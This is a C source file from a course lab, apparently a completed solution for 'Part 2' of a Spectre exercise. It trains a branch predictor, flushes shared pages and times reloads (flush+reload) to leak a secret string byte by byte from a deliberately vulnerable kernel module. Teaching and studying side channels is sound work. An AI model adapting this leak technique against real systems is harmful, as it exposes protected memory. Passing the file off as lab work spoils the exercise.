/*
 * Exploiting Speculative Execution
 *
 * Part 2
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

/*
 * call_kernel_part2
 * Performs the COMMAND_PART2 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART2;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

// Helper method to flush the shared memory pages before the attack
static void flush_shared_pages(char *shared_memory) {
    for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        clflush(shared_memory + (i * SHD_SPECTRE_LAB_PAGE_SIZE));
    }
}

// Helper method to reload each shared page and identify the one the victim touched
static char reload_shared_page(char *shared_memory) {
    const uint64_t reload_threshold = 130; // threshold for distinguishing cache hits vs misses
    uint64_t best_time = UINT64_MAX;
    size_t best_index = 0;

    for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        char *addr = shared_memory + (i * SHD_SPECTRE_LAB_PAGE_SIZE);
        uint64_t access_time = time_access(addr);

        // If this access is a cache hit, we can be pretty confident this is the right page and return immediately
        if (access_time < reload_threshold) {
            return (char)i;
        }

        // if this is the best we've seen so far, remember it
        if (access_time < best_time) {
            best_time = access_time;
            best_index = i;
        }
    }

    return (char)best_index;
}

// Return the fastest page index if it looks like a cache hit; otherwise return -1
static int fastest_hit_page(char *shared_memory, uint64_t threshold, uint64_t *best_time_out) {
    uint64_t best_time = UINT64_MAX;
    size_t best_index = 0;

    for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        size_t idx = ((i * 167) + 13) & 0xff;
        char *addr = shared_memory + (idx * SHD_SPECTRE_LAB_PAGE_SIZE);
        uint64_t access_time = time_access(addr);
        if (access_time < best_time) {
            best_time = access_time;
            best_index = idx;
        }
    }

    if (best_time_out != NULL) {
        *best_time_out = best_time;
    }

    if (best_time < threshold) {
        return (int)best_index;
    }
    return -1;
}

// Repeatedly perform Train/Flush/Victim/Reload and decode the most likely byte by vote count
static char leak_byte_part2(int kernel_fd, char *shared_memory, size_t target_offset) {
    const uint64_t reload_threshold = 130;
    const size_t training_rounds = 1;
    const size_t attack_attempts = 700;
    size_t hit_counts[SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES] = {0};

    for (size_t attempt = 0; attempt < attack_attempts; attempt++) {
        // Train predictor with in-bounds offsets so the victim branch is predicted taken
        for (size_t train = 0; train < training_rounds; train++) {
            call_kernel_part2(kernel_fd, shared_memory, train & 0x3);
        }

        // Flush after training so in-bounds loads do not dominate the measurement
        flush_shared_pages(shared_memory);

        // Trigger victim once with the target offset
        call_kernel_part2(kernel_fd, shared_memory, target_offset);

        // Measure and record only the strongest candidate each attempt
        uint64_t best_time = UINT64_MAX;
        int idx = fastest_hit_page(shared_memory, reload_threshold, &best_time);
        if (idx >= 0) {
            hit_counts[(size_t)idx]++;
        }
    }

    size_t best_index = 0;
    size_t best_count = 0;
    for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        if (hit_counts[i] > best_count) {
            best_count = hit_counts[i];
            best_index = i;
        }
    }

    // Fallback if no clear hit was observed in this byte window
    if (best_count == 0) {
        return reload_shared_page(shared_memory);
    }

    return (char)best_index;
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;

        // [Part 2]- Fill this in!
        // leaked_byte = ??
        leaked_byte = leak_byte_part2(kernel_fd, shared_memory, current_offset);

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 2] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
